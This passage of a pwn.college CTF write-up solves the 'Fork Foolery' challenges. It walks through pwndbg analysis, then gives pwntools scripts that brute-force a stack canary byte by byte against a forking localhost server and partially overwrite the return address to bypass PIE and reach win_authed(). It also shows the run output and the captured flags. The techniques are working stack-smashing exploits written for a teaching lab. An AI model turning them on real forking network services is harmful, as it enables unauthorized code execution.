import struct

context.arch = 'amd64'
context.log_level = 'error'

host = '127.0.0.1'
port = 1337

buffer_addr = 0x7fff04f2a750
canary_addr = 0x7fff04f2a798
addr_of_saved_ip = 0x7fff04f2a7a8

# Target instruction in win_authed() that skips the 0x1337 check
safe_win_authed_offset = 0x87d0 

# --- STAGE 1: BRUTE FORCE CANARY ---
known_canary = b'\x00'
print("[*] Stage 1: Brute-forcing Canary byte-by-byte...")

for i in range(7):
    found_byte = False
    for byte_guess in range(256):
        try:
            p = remote(host, port)
            p.recvuntil(b"Payload size: ")

            # Calculate current_guess, offset_to_canary, payload_size
            current_guess = known_canary + p8(byte_guess)
            offset_to_canary = canary_addr - buffer_addr
            payload_size = offset_to_canary + len(current_guess)
            
            # Send payload size
            current_guess = known_canary + p8(byte_guess)
            p.sendline(str(payload_size).encode())

            # Carft payload
            payload = b"A" * offset_to_canary
            payload += current_guess

            # Send payload
            p.recvuntil(b"bytes)!")
            p.send(payload)
            
            output = p.recvall(timeout=0.4)
            
            # Oracle: Success if Goodbye is present AND no stack smashing error
            if b"Goodbye!" in output and b"stack smashing detected" not in output:
                known_canary += p8(byte_guess)
                print(f"[+] Found byte {i+1}: {hex(byte_guess)} | Current: 0x{known_canary.hex()}")
                found_byte = True
                p.close()
                break
            p.close()
        except EOFError:
            pass

    if not found_byte:
        print(f"[!] Failed to leak canary at byte {i+1}.")
        exit()

leaked_canary_int = u64(known_canary)
print(f"[*] FINAL LEAKED CANARY: {hex(leaked_canary_int)}")

# --- STAGE 2: BRUTE FORCE RIP (ASLR) ---
print(f"[*] Stage 2: Starting RIP brute force loop (Target: {hex(safe_win_authed_offset)})")
attempt = 0

while True:
    attempt += 1
    p = None
    try:
        p = remote(host, port, timeout=1)
        p.recvuntil(b"Payload size: ")

        # Calculate offset_to_ret, payload_size
        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
        payload_size = offset_to_canary + 8 + offset_to_ret + 2
        
        # Send payload size
        p.sendline(str(payload_size).encode())
     
        # Build the payload using the canary we just leaked
        payload = b"A" * offset_to_canary
        payload += known_canary
        payload += b"B" * offset_to_ret
        payload += struct.pack("<H", safe_win_authed_offset)

        # Send payload
        p.recvuntil(b"bytes)!")
        p.send(payload)
        
        output = p.recvall(timeout=1).decode(errors='ignore')
        
        if "pwn.college{" in output:
            print(f"\n[!] SUCCESS on attempt {attempt}!")
            print(output)
            break
        
        p.close()
        if attempt % 10 == 0:
            print(f"[*] RIP Attempt {attempt}...", end='\r')
            
    except Exception:
        if p: p.close()
        pass
```

```
hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
[*] Stage 1: Brute-forcing Canary byte-by-byte...
[+] Found byte 1: 0xb4 | Current: 0x00b4
[+] Found byte 2: 0x7c | Current: 0x00b47c
[+] Found byte 3: 0x97 | Current: 0x00b47c97
[+] Found byte 4: 0x45 | Current: 0x00b47c9745
[+] Found byte 5: 0xd3 | Current: 0x00b47c9745d3
[+] Found byte 6: 0xe0 | Current: 0x00b47c9745d3e0
[+] Found byte 7: 0x2d | Current: 0x00b47c9745d3e02d
[*] FINAL LEAKED CANARY: 0x2de0d345977cb400
[*] Stage 2: Starting RIP brute force loop (Target: 0x87d0)

[!] SUCCESS on attempt 1!

You sent 90 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 5a 00 00 00 | 0x0000005aa7aebab8 |
| 0x00007fff04f2a740 (rsp+0x0030) | 5a 00 00 00 00 00 00 00 | 0x000000000000005a |
| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
| 0x00007fff04f2a7a0 (rsp+0x0090) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fff04f2a7a8 (rsp+0x0098) | d0 87 ae a7 a4 64 00 00 | 0x000064a4a7ae87d0 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff04f2a750
- the saved frame pointer (of main) is at 0x7fff04f2a7a0
- the saved return address (previously to main) is at 0x7fff04f2a7a8
- the saved return address is now pointing to 0x64a4a7ae87d0.
- the canary is stored at 0x7fff04f2a798.
- the canary value is now 0x2de0d345977cb400.
- the address of win_authed() is 0x64a4a7ae87b4.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{E-BMCb-mkeLzxLOaK3n1Bln9zn2.01NxMDL4ITM0EzW}
```

&nbsp;

## Fork Foolery (Hard)

```
hacker@program-security~fork-foolery-hard:/$ /challenge/fork-foolery-hard 
###
### Welcome to /challenge/fork-foolery-hard!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited sequential connections.
```

We need the following in order to craft an exploit:

- [ ] Location of the buffer
- [ ] Location of the canary
- [ ] Location of stored return address to `main()`
- [ ] Offset of instruction within `win_authed()` which skips the authentication

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000011a0  __cxa_finalize@plt
0x00000000000011b0  putchar@plt
0x00000000000011c0  __errno_location@plt
0x00000000000011d0  puts@plt
0x00000000000011e0  setsockopt@plt
0x00000000000011f0  write@plt
0x0000000000001200  __stack_chk_fail@plt
0x0000000000001210  htons@plt
0x0000000000001220  dup2@plt
0x0000000000001230  printf@plt
0x0000000000001240  geteuid@plt
0x0000000000001250  close@plt
0x0000000000001260  read@plt
0x0000000000001270  listen@plt
0x0000000000001280  setvbuf@plt
0x0000000000001290  bind@plt
0x00000000000012a0  open@plt
0x00000000000012b0  accept@plt
0x00000000000012c0  __isoc99_scanf@plt
0x00000000000012d0  exit@plt
0x00000000000012e0  strerror@plt
0x00000000000012f0  wait@plt
0x0000000000001300  fork@plt
0x0000000000001310  socket@plt
0x0000000000001320  _start
0x0000000000001350  deregister_tm_clones
0x0000000000001380  register_tm_clones
0x00000000000013c0  __do_global_dtors_aux
0x0000000000001400  frame_dummy
0x0000000000001409  bin_padding
0x0000000000002029  win_authed
0x0000000000002146  challenge
0x0000000000002256  main
0x00000000000024a0  __libc_csu_init
0x0000000000002510  __libc_csu_fini
0x0000000000002518  _fini
```

#### `win_authed()` 

```
pwndbg> disassemble win_authed 
Dump of assembler code for function win_authed:
   0x0000000000002029 <+0>:     endbr64
   0x000000000000202d <+4>:     push   rbp
   0x000000000000202e <+5>:     mov    rbp,rsp
   0x0000000000002031 <+8>:     sub    rsp,0x10
   0x0000000000002035 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000002038 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x000000000000203f <+22>:    jne    0x2143 <win_authed+282>
   0x0000000000002045 <+28>:    lea    rdi,[rip+0xfbc]        # 0x3008

# ---- snip ----

   0x0000000000002143 <+282>:   nop
   0x0000000000002144 <+283>:   leave
   0x0000000000002145 <+284>:   ret
End of assembler dump.
```

- [ ] Location of the buffer
- [ ] Location of the canary
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2045`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000002146 <+0>:     endbr64
   0x000000000000214a <+4>:     push   rbp
   0x000000000000214b <+5>:     mov    rbp,rsp
   0x000000000000214e <+8>:     sub    rsp,0x70
   0x0000000000002152 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000002155 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000002159 <+19>:    mov    QWORD PTR [rbp-0x68],rdx
   0x000000000000215d <+23>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000002166 <+32>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000000216a <+36>:    xor    eax,eax
   0x000000000000216c <+38>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000002174 <+46>:    mov    QWORD PTR [rbp-0x28],0x0
   0x000000000000217c <+54>:    mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000002184 <+62>:    mov    QWORD PTR [rbp-0x18],0x0
   0x000000000000218c <+70>:    mov    QWORD PTR [rbp-0x10],0x0
   0x0000000000002194 <+78>:    lea    rax,[rbp-0x30]
   0x0000000000002198 <+82>:    mov    QWORD PTR [rbp-0x38],rax
   0x000000000000219c <+86>:    mov    QWORD PTR [rbp-0x40],0x0
   0x00000000000021a4 <+94>:    lea    rdi,[rip+0xf61]        # 0x310c
   0x00000000000021ab <+101>:   mov    eax,0x0
   0x00000000000021b0 <+106>:   call   0x1230 <printf@plt>
   0x00000000000021b5 <+111>:   lea    rax,[rbp-0x40]
   0x00000000000021b9 <+115>:   mov    rsi,rax
   0x00000000000021bc <+118>:   lea    rdi,[rip+0xf58]        # 0x311b
   0x00000000000021c3 <+125>:   mov    eax,0x0
   0x00000000000021c8 <+130>:   call   0x12c0 <__isoc99_scanf@plt>
   0x00000000000021cd <+135>:   mov    rax,QWORD PTR [rbp-0x40]
   0x00000000000021d1 <+139>:   mov    rsi,rax
   0x00000000000021d4 <+142>:   lea    rdi,[rip+0xf45]        # 0x3120
   0x00000000000021db <+149>:   mov    eax,0x0
   0x00000000000021e0 <+154>:   call   0x1230 <printf@plt>
   0x00000000000021e5 <+159>:   mov    rdx,QWORD PTR [rbp-0x40]
   0x00000000000021e9 <+163>:   mov    rax,QWORD PTR [rbp-0x38]
   0x00000000000021ed <+167>:   mov    rsi,rax
   0x00000000000021f0 <+170>:   mov    edi,0x0
   0x00000000000021f5 <+175>:   call   0x1260 <read@plt>
   0x00000000000021fa <+180>:   mov    DWORD PTR [rbp-0x44],eax
   0x00000000000021fd <+183>:   cmp    DWORD PTR [rbp-0x44],0x0
   0x0000000000002201 <+187>:   jns    0x222f <challenge+233>
   0x0000000000002203 <+189>:   call   0x11c0 <__errno_location@plt>
   0x0000000000002208 <+194>:   mov    eax,DWORD PTR [rax]
   0x000000000000220a <+196>:   mov    edi,eax
   0x000000000000220c <+198>:   call   0x12e0 <strerror@plt>
   0x0000000000002211 <+203>:   mov    rsi,rax
   0x0000000000002214 <+206>:   lea    rdi,[rip+0xf2d]        # 0x3148
   0x000000000000221b <+213>:   mov    eax,0x0
   0x0000000000002220 <+218>:   call   0x1230 <printf@plt>
   0x0000000000002225 <+223>:   mov    edi,0x1
   0x000000000000222a <+228>:   call   0x12d0 <exit@plt>
   0x000000000000222f <+233>:   lea    rdi,[rip+0xf36]        # 0x316c
   0x0000000000002236 <+240>:   call   0x11d0 <puts@plt>
   0x000000000000223b <+245>:   mov    eax,0x0
   0x0000000000002240 <+250>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000002244 <+254>:   xor    rcx,QWORD PTR fs:0x28
   0x000000000000224d <+263>:   je     0x2254 <challenge+270>
   0x000000000000224f <+265>:   call   0x1200 <__stack_chk_fail@plt>
   0x0000000000002254 <+270>:   leave
   0x0000000000002255 <+271>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+175` where the call to `read@plt` is made.

```
pwndbg> break *(challenge+175)
Breakpoint 1 at 0x21f5
```

```
pwndbg> run
Starting program: /challenge/fork-foolery-hard 
###
### Welcome to /challenge/fork-foolery-hard!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited sequential connections.
```

The challenge needs some input to proceed. Let's use our hello world script from last challenge.

```py title="~/script.py" showLineNumbers
from pwn import *

# Configuration
HOST = '127.0.0.1'
PORT = 1337
OFFSET_TO_CANARY = 72 

context.log_level = 'info'

# 1. Connect
p = remote(HOST, PORT)

# 2. Handle Size Prompt
p.recvuntil(b"Payload size: ")
# 72 bytes of padding + 1 byte for the canary null
p.sendline(b"73")

# 3. Send Payload
p.recvuntil(b"bytes)!")
# Payload: Padding followed by the first byte of the canary (\x00)
payload = b"A" * OFFSET_TO_CANARY + b"\x00"
p.send(payload)

# 4. Print Response
print("\n--- RESPONSE ---")
print(p.recvall(timeout=1).decode(errors='ignore'))

p.close()
```

```
hacker@program-security~fork-foolery-hard:/$ python ~/script.py 
[+] Opening connection to 127.0.0.1 on port 1337: Done

--- RESPONSE ---
[+] Receiving all data: Done (1B)
[*] Closed connection to 127.0.0.1 port 1337
```

Looking back at Pwndbg.

```
pwndbg> run
Starting program: /challenge/fork-foolery-hard 
###
### Welcome to /challenge/fork-foolery-hard!
###

This challenge is listening for connections on TCP port 1337.

The challenge supports unlimited sequential connections.

[Attaching after process 1229 fork to child process 1946]
[New inferior 2 (process 1946)]
[Detaching after fork from parent process 1229]
[Inferior 1 (process 1229) detached]
[Switching to process 1946]

Thread 2.1 "fork-foolery-ha" hit Breakpoint 1, 0x00005817ef99a1f5 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd8aa00320 ◂— 0
 RBX  0x5817ef99a4a0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x49
 RDI  0
 RSI  0x7ffd8aa00320 ◂— 0
 R8   0x24
 R9   0x24
 R10  0x5817ef99b13c ◂— ' bytes)!\n'
 R11  0x246
 R12  0x5817ef999320 (_start) ◂— endbr64 
 R13  0x7ffd8aa01490 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd8aa00350 —▸ 0x7ffd8aa013a0 ◂— 0
 RSP  0x7ffd8aa002e0 —▸ 0x7650459246a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RIP  0x5817ef99a1f5 (challenge+175) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5817ef99a1f5 <challenge+175>    call   read@plt                    <read@plt>
        fd: 0 (socket:[455964966])
        buf: 0x7ffd8aa00320 ◂— 0
        nbytes: 0x49
 
   0x5817ef99a1fa <challenge+180>    mov    dword ptr [rbp - 0x44], eax
   0x5817ef99a1fd <challenge+183>    cmp    dword ptr [rbp - 0x44], 0
   0x5817ef99a201 <challenge+187>    jns    challenge+233               <challenge+233>
 
   0x5817ef99a203 <challenge+189>    call   __errno_location@plt        <__errno_location@plt>
 
   0x5817ef99a208 <challenge+194>    mov    eax, dword ptr [rax]
   0x5817ef99a20a <challenge+196>    mov    edi, eax
   0x5817ef99a20c <challenge+198>    call   strerror@plt                <strerror@plt>
 
   0x5817ef99a211 <challenge+203>    mov    rsi, rax
   0x5817ef99a214 <challenge+206>    lea    rdi, [rip + 0xf2d]     RDI => 0x5817ef99b148 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x5817ef99a21b <challenge+213>    mov    eax, 0                 EAX => 0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd8aa002e0 —▸ 0x7650459246a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-068 0x7ffd8aa002e8 —▸ 0x7ffd8aa014a8 —▸ 0x7ffd8aa0269a ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060 0x7ffd8aa002f0 —▸ 0x7ffd8aa01498 —▸ 0x7ffd8aa0267d ◂— '/challenge/fork-foolery-hard'
03:0018│-058 0x7ffd8aa002f8 ◂— 0x1459204a0
04:0020│-050 0x7ffd8aa00300 ◂— 0
05:0028│-048 0x7ffd8aa00308 —▸ 0x7650457c7e93 (_IO_file_overflow+275) ◂— cmp eax, -1
06:0030│-040 0x7ffd8aa00310 ◂— 0x49 /* 'I' */
07:0038│-038 0x7ffd8aa00318 —▸ 0x7ffd8aa00320 ◂— 0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5817ef99a1f5 challenge+175
   1   0x5817ef99a476 main+544
   2   0x76504575b083 __libc_start_main+243
   3   0x5817ef99934e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffd8aa00320`
- [ ] Location of the canary
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2045`

Let's get the location of the canary.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd8aa00360:
 rip = 0x5817ef99a1f5 in challenge; saved rip = 0x5817ef99a476
 called by frame at 0x7ffd8aa013b0
 Arglist at 0x7ffd8aa00350, args: 
 Locals at 0x7ffd8aa00350, Previous frame's sp is 0x7ffd8aa00360
 Saved registers:
  rbp at 0x7ffd8aa00350, rip at 0x7ffd8aa00358
```

```
pwndbg> x/10gx $rsi
0x7ffd8aa00320: 0x0000000000000000      0x0000000000000000
0x7ffd8aa00330: 0x0000000000000000      0x0000000000000000
0x7ffd8aa00340: 0x0000000000000000      0x8722780fb62d8a00
0x7ffd8aa00350: 0x00007ffd8aa013a0      0x00005817ef99a476
0x7ffd8aa00360: 0x000000000004d2c4      0x00007ffd8aa014a8
```

- [x] Location of the buffer: `0x7ffd8aa00320`
- [x] Location of the canary: `0x7ffd8aa00348`
- [x] Location of stored return address to `main()`: `0x7ffd8aa00358`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2045`

### Exploit

```py title="~/script.py"
from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'error'

host = '127.0.0.1'
port = 1337

buffer_addr = 0x7fffe51e2290
canary_addr = 0x7fffe51e22b8
addr_of_saved_ip = 0x7fffe51e22c8

# Target instruction in win_authed() that skips the 0x1337 check
safe_win_authed_offset = 0x2045 

# --- STAGE 1: BRUTE FORCE CANARY ---
known_canary = b'\x00'
print("[*] Stage 1: Brute-forcing Canary byte-by-byte...")

for i in range(7):
    found_byte = False
    for byte_guess in range(256):
        try:
            p = remote(host, port)
            p.recvuntil(b"Payload size: ")

            # Calculate current_guess, offset_to_canary, payload_size
            current_guess = known_canary + p8(byte_guess)
            offset_to_canary = canary_addr - buffer_addr
            payload_size = offset_to_canary + len(current_guess)
            
            # Send payload size
            current_guess = known_canary + p8(byte_guess)
            p.sendline(str(payload_size).encode())

            # Carft payload
            payload = b"A" * offset_to_canary
            payload += current_guess

            # Send payload
            p.recvuntil(b"bytes)!")
            p.send(payload)
            
            output = p.recvall(timeout=0.4)
            
            # Oracle: Success if Goodbye is present AND no stack smashing error
            if b"Goodbye!" in output and b"stack smashing detected" not in output:
                known_canary += p8(byte_guess)
                print(f"[+] Found byte {i+1}: {hex(byte_guess)} | Current: 0x{known_canary.hex()}")
                found_byte = True
                p.close()
                break
            p.close()
        except EOFError:
            pass

    if not found_byte:
        print(f"[!] Failed to leak canary at byte {i+1}.")
        exit()

leaked_canary_int = u64(known_canary)
print(f"[*] FINAL LEAKED CANARY: {hex(leaked_canary_int)}")

# --- STAGE 2: BRUTE FORCE RIP (ASLR) ---
print(f"[*] Stage 2: Starting RIP brute force loop (Target: {hex(safe_win_authed_offset)})")
attempt = 0

while True:
    attempt += 1
    p = None
    try:
        p = remote(host, port, timeout=1)
        p.recvuntil(b"Payload size: ")

        # Calculate offset_to_ret, payload_size
        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
        payload_size = offset_to_canary + 8 + offset_to_ret + 2
        
        # Send payload size
        p.sendline(str(payload_size).encode())
     
        # Build the payload using the canary we just leaked
        payload = b"A" * offset_to_canary
        payload += known_canary
        payload += b"B" * offset_to_ret
        payload += struct.pack("<H", safe_win_authed_offset)

        # Send payload
        p.recvuntil(b"bytes)!")
        p.send(payload)
        
        output = p.recvall(timeout=1).decode(errors='ignore')
        
        if "pwn.college{" in output:
            print(f"\n[!] SUCCESS on attempt {attempt}!")
            print(output)
            break
        
        p.close()
        if attempt % 10 == 0:
            print(f"[*] RIP Attempt {attempt}...", end='\r')
            
    except Exception:
        if p: p.close()
        pass
```

```
hacker@program-security~fork-foolery-hard:/$ python ~/script.py 
[*] Stage 1: Brute-forcing Canary byte-by-byte...
[+] Found byte 1: 0x84 | Current: 0x0084
[+] Found byte 2: 0x7f | Current: 0x00847f
[+] Found byte 3: 0x7c | Current: 0x00847f7c
[+] Found byte 4: 0xd3 | Current: 0x00847f7cd3
[+] Found byte 5: 0x74 | Current: 0x00847f7cd374
[+] Found byte 6: 0xa9 | Current: 0x00847f7cd374a9
[+] Found byte 7: 0xdb | Current: 0x00847f7cd374a9db
[*] FINAL LEAKED CANARY: 0xdba974d37c7f8400
[*] Stage 2: Starting RIP brute force loop (Target: 0x2045)
[*] RIP Attempt 2000...
```

I first tried with the above script, until I realized that the parent process is persistent.
So the sending the offset multiple times and hoping that the 4th least significant nibble of the actual address corresponds with the one I am sending won't be the best solution.
For that we have to close the binary listener, start it again, and send our payloads again.

The approach I settled on was to brute force the 4th least significant nibble actively.

```py title="~/script.py" showLineNumbers
from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'error'

host = '127.0.0.1'
port = 1337

# Memory layout offsets from your GDB analysis
# buffer: 0x...290 | canary: 0x...2b8 | saved_ip: 0x...2c8
buffer_addr = 0x7fffe51e2290
canary_addr = 0x7fffe51e22b8
addr_of_saved_ip = 0x7fffe51e22c8

# Calculated offsets
offset_to_canary = canary_addr - buffer_addr # 40 bytes
offset_to_ret = addr_of_saved_ip - (canary_addr + 8) # 8 bytes (saved RBP)

# The 3 least significant nibbles we are targeting
TARGET_PAGE_OFFSET = 0x045 

# --- STAGE 1: LEAK CANARY ---
known_canary = b'\x00'
print("[*] Stage 1: Brute-forcing Canary...")

for i in range(7):
    for byte_guess in range(256):
        try:
            p = remote(host, port)
            p.recvuntil(b"Payload size: ")
            
            offset_to_canary = canary_addr - buffer_addr
            current_guess = known_canary + p8(byte_guess)
            p.sendline(str(offset_to_canary + len(current_guess)).encode())

            payload = b"A" * offset_to_canary + current_guess
            p.recvuntil(b"bytes)!")
            p.send(payload)
            
            output = p.recvall(timeout=0.4)
            if b"Goodbye!" in output and b"stack smashing" not in output:
                known_canary += p8(byte_guess)
                print(f"[+] Found byte {i+1}: {hex(byte_guess)} | Current: 0x{known_canary.hex()}")
                p.close()
                break
            p.close()
        except EOFError:
            pass

print(f"[*] FINAL LEAKED CANARY: {hex(u64(known_canary))}")

# --- STAGE 2: BRUTE FORCE PIE NIBBLE ---
print(f"[*] Stage 2: Brute-forcing PIE nibble for page offset {hex(TARGET_PAGE_OFFSET)}...")

# We iterate through all 16 possibilities (0-F) for the 4th nibble
for nibble in range(16):
    # Combine the randomized nibble with our known page offset
    target_addr = (nibble << 12) | TARGET_PAGE_OFFSET
    
    print(f"[*] Testing nibble {hex(nibble)} (Address suffix: {hex(target_addr)})...", end='\r')
    
    try:
        p = remote(host, port)
        p.recvuntil(b"Payload size: ")
        
        # 40 (padding) + 8 (canary) + 8 (rbp) + 2 (RIP overwrite) = 58 bytes
        payload_size = offset_to_canary + 8 + offset_to_ret + 2
        p.sendline(str(payload_size).encode())
        p.recvuntil(b"bytes)!")
        
        payload = b"A" * offset_to_canary
        payload += known_canary
        payload += b"B" * offset_to_ret
        payload += struct.pack("<H", target_addr)
        
        p.send(payload)
        
        # Give the server a moment to respond with the flag
        output = p.recvrepeat(1.0).decode(errors='ignore')
        
        if "pwn.college{" in output:
            print(f"\n\n[!] SUCCESS! Nibble {hex(nibble)} worked.")
            print(output)
            exit()
        
        if "Permission denied" in output:
            print(f"\n[!] Hit correct nibble {hex(nibble)} but permissions failed. Target: {hex(target_addr)}")
            
        p.close()
    except Exception:
        continue

print("\n[!] Brute-force complete. If no flag, check your stack offsets.")
```

```
hacker@program-security~fork-foolery-hard:/$ python ~/2_script.py 
[*] Stage 1: Brute-forcing Canary...
[+] Found byte 1: 0x84 | Current: 0x0084
[+] Found byte 2: 0x7f | Current: 0x00847f
[+] Found byte 3: 0x7c | Current: 0x00847f7c
[+] Found byte 4: 0xd3 | Current: 0x00847f7cd3
[+] Found byte 5: 0x74 | Current: 0x00847f7cd374
[+] Found byte 6: 0xa9 | Current: 0x00847f7cd374a9
[+] Found byte 7: 0xdb | Current: 0x00847f7cd374a9db
[*] FINAL LEAKED CANARY: 0xdba974d37c7f8400
[*] Stage 2: Brute-forcing PIE nibble for page offset 0x45...
[*] Testing nibble 0x9 (Address suffix: 0x9045)...

[!] SUCCESS! Nibble 0x9 worked.

Goodbye!
You win! Here is your flag:
pwn.college{w6VFD6ynO9FNrkx1MGQ3P_3vFyz.0FOxMDL4ITM0EzW}
```